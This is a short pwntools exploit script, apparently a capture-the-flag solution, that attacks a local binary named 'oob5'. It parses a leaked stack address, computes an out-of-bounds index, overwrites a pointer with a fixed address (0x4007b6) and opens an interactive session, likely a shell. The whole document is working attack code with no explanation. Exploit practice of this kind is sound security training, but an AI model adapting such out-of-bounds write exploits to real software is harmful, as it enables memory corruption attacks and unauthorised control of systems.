from pwn import *

sh=process("./oob5")
sh.recvuntil("Stack Ref = ")
leak=sh.recvline()
#print "leak: "+leak
#print "Use this :" + str((int(leak,16)-0x18-0x601040)/8)
sh.sendline(str((int(leak,16)-0x18-0x601040)/8))
sh.sendline(p64(0x4007b6))
sh.interactive()
